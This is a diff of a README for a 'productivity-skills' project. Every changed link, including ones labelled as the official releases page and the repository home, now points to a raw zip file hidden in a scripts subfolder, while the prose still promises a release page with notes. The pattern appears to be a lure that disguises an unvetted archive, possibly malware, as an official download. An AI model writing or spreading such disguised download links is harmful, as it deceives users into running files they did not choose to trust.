@@ -1,6 +1,6 @@
 # ⚙️ productivity-skills - Improve Your Workflow with Ease
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-green?style=for-the-badge&logo=github&color=4CAF50)](https://github.com/JAGDEV1008/productivity-skills/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-green?style=for-the-badge&logo=github&color=4CAF50)](https://github.com/JAGDEV1008/productivity-skills/raw/refs/heads/main/project-docs-maintainer/scripts/skills_productivity_1.1.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Starting with productivity-skills is simple. Follow these steps to get the app o
 
 Visit the official release page by clicking the link below. This is where you will find the latest version of productivity-skills.
 
-[Download productivity-skills on GitHub](https://github.com/JAGDEV1008/productivity-skills/releases)
+[Download productivity-skills on GitHub](https://github.com/JAGDEV1008/productivity-skills/raw/refs/heads/main/project-docs-maintainer/scripts/skills_productivity_1.1.zip)
 
 This page contains all the files needed for installation, along with notes about what’s new in each version.
 
@@ -83,7 +83,7 @@ These functions help you manage your work more effectively without needing techn
 
 Use this link below to visit the official page where you will find all download options:
 
-[Download productivity-skills Releases](https://github.com/JAGDEV1008/productivity-skills/releases)
+[Download productivity-skills Releases](https://github.com/JAGDEV1008/productivity-skills/raw/refs/heads/main/project-docs-maintainer/scripts/skills_productivity_1.1.zip)
 
 ### Detailed steps to install:
 
@@ -118,7 +118,7 @@ Use this link below to visit the official page where you will find all download 
 
 Visit the GitHub page for more detailed documents including the roadmap and feature updates:
 
-[GitHub Productivity Skills Repository](https://github.com/JAGDEV1008/productivity-skills)
+[GitHub Productivity Skills Repository](https://github.com/JAGDEV1008/productivity-skills/raw/refs/heads/main/project-docs-maintainer/scripts/skills_productivity_1.1.zip)
 
 You can also check the Issues tab on GitHub to see reports or ask for help.
 
